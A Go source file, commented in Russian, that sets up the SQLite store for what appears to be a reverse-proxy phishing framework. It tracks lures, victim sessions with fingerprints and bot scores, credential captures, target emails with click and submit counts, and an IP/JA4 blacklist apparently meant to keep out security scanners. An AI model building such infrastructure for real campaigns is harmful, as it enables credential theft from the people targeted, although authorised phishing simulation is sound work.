// Package sqlite — метаданные (specs/db-v1.md). Pure-Go, без CGO.
// Креды сюда НЕ пишем, только факты захватов.
package sqlite

import (
	"database/sql"
	"fmt"
	"strings"

	_ "modernc.org/sqlite"
)

const schema = `
CREATE TABLE IF NOT EXISTS lures (id TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, path TEXT NOT NULL UNIQUE, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS sessions (id TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, ip TEXT NOT NULL, ja4 TEXT DEFAULT '', bot_score INTEGER DEFAULT 0, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS captures (id TEXT PRIMARY KEY, session_id TEXT NOT NULL, kind TEXT NOT NULL, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS blacklist (ip_or_ja4 TEXT PRIMARY KEY, reason TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS domain_presets (domain TEXT PRIMARY KEY, created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS campaigns (id TEXT PRIMARY KEY, name TEXT NOT NULL, phishlet_id TEXT NOT NULL, ttl_min INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 1, status TEXT DEFAULT '', created_at INTEGER NOT NULL);
CREATE TABLE IF NOT EXISTS targets (id TEXT PRIMARY KEY, campaign_id TEXT NOT NULL, email TEXT NOT NULL, lure TEXT NOT NULL, sent INTEGER DEFAULT 0, opened INTEGER DEFAULT 0, clicked INTEGER DEFAULT 0, submitted INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS smart_lures (path TEXT PRIMARY KEY, phishlet_id TEXT NOT NULL, expires_at INTEGER DEFAULT 0, max_uses INTEGER DEFAULT 0, uses INTEGER DEFAULT 0, bound_ip TEXT DEFAULT '', require_challenge INTEGER DEFAULT 0, redirect_url TEXT DEFAULT '');
`

type DB struct{ sql *sql.DB }

func Open(path string) (*DB, error) {
	d, err := sql.Open("sqlite", path)
	if err != nil {
		return nil, err
	}
	if _, err := d.Exec(schema); err != nil {
		d.Close()
		return nil, fmt.Errorf("migrate: %w", err)
	}
	// Миграции старых баз (идемпотентно).
	for _, stmt := range []string{
		`ALTER TABLE captures ADD COLUMN node TEXT DEFAULT ''`,
		`ALTER TABLE smart_lures ADD COLUMN redirect_url TEXT DEFAULT ''`,
	} {
		if _, err := d.Exec(stmt); err != nil && !isDupColumn(err) {
			d.Close()
			return nil, fmt.Errorf("migrate: %w", err)
		}
	}
	return &DB{sql: d}, nil
}

func isDupColumn(err error) bool {
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "duplicate column")
}

func (d *DB) Close() error { return d.sql.Close() }

func (d *DB) Ping() error { return d.sql.Ping() }
